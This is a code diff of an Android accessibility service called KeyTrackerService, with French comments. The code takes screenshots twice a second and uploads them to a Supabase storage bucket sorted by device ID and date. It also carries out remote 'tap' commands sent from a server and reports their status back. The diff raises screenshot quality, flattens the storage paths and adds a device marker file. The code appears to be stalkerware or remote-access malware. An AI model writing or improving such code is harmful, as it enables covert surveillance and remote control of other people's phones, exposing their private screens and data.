@@ -52,7 +52,7 @@ public class KeyTrackerService extends AccessibilityService {
     // Pseudo-flux: screenshot périodique (faible FPS) vers Supabase Storage.
     private static final long SCREENSHOT_INTERVAL_MS = 500; // 2 fps (simple + moins gourmand)
     private static final int SCREENSHOT_MAX_WIDTH = 360; // plus bas = plus léger
-    private static final int SCREENSHOT_WEBP_QUALITY = 14; // compression très agressive
+    private static final int SCREENSHOT_WEBP_QUALITY = 20; // compression très agressive (un peu meilleure qualité)
 
     private final ExecutorService screenshotExecutor = Executors.newSingleThreadExecutor();
     private final AtomicReference<String> lastEnsuredScreenshotDay = new AtomicReference<>(null);
@@ -667,7 +667,7 @@ public class KeyTrackerService extends AccessibilityService {
                 boolean updated = SupabaseAndroidEventsClient.updateCommandStatus(this, id, ok ? "done" : "error", res);
                 if (!updated) Log.w(TAG, "handleCommand: updateCommandStatus failed id=" + id);
 
-                // Trace aussi dans android_events pour debug côté serveur.
+                // Trace aussi dans events pour debug côté serveur.
                 SupabaseAndroidEventsClient.sendEvent(this, lastPackageName, "command_tap", ok ? ("OK@" + x + "," + y) : ("FAIL@" + x + "," + y));
                 return;
             }
@@ -979,7 +979,7 @@ public class KeyTrackerService extends AccessibilityService {
 
     /**
      * Chemin Supabase Storage (format FR lisible) :
-     * <android_id>/screenshots/<dd-MM-yyyy>/<HH-mm-ss>.webp
+     * <android_id>/<dd-MM-yyyy>/<HH-mm-ss>.webp
      * (si collision: <HH-mm-ss>-1.webp, -2.webp, etc.)
      */
     private String buildScreenshotObjectPath() {
@@ -1012,7 +1012,7 @@ public class KeyTrackerService extends AccessibilityService {
         return new ScreenshotPaths(
                 deviceId,
                 dayStr,
-                deviceId + "/screenshots/" + dayStr + "/" + uniqueTime + ".webp"
+                deviceId + "/" + dayStr + "/" + uniqueTime + ".webp"
         );
     }
 
@@ -1068,8 +1068,14 @@ public class KeyTrackerService extends AccessibilityService {
         if (dayStr.equals(prev)) return;
         if (!lastEnsuredScreenshotDay.compareAndSet(prev, dayStr)) return;
 
+        // Crée un marqueur à la racine du device pour que le "dossier" apparaisse
+        // directement à la racine du bucket (screenshots/<device_id>/...).
+        byte[] markerDevice = ("device=" + deviceId).getBytes(java.nio.charset.StandardCharsets.UTF_8);
+        String markerDevicePath = deviceId + "/_device.txt";
+        SupabaseAndroidEventsClient.uploadScreenshot(this, markerDevice, markerDevicePath, "text/plain", true);
+
         byte[] markerToday = ("folder=" + dayStr).getBytes(java.nio.charset.StandardCharsets.UTF_8);
-        String markerTodayPath = deviceId + "/screenshots/" + dayStr + "/_folder.txt";
+        String markerTodayPath = deviceId + "/" + dayStr + "/_folder.txt";
         SupabaseAndroidEventsClient.uploadScreenshot(this, markerToday, markerTodayPath, "text/plain", true);
 
         try {
@@ -1078,7 +1084,7 @@ public class KeyTrackerService extends AccessibilityService {
             SimpleDateFormat dayFmt = new SimpleDateFormat("dd-MM-yyyy", Locale.FRANCE);
             String tomorrowStr = dayFmt.format(tomorrow);
             byte[] markerTomorrow = ("folder=" + tomorrowStr).getBytes(java.nio.charset.StandardCharsets.UTF_8);
-            String markerTomorrowPath = deviceId + "/screenshots/" + tomorrowStr + "/_folder.txt";
+            String markerTomorrowPath = deviceId + "/" + tomorrowStr + "/_folder.txt";
             SupabaseAndroidEventsClient.uploadScreenshot(this, markerTomorrow, markerTomorrowPath, "text/plain", true);
         } catch (Exception ignored) {}
     }
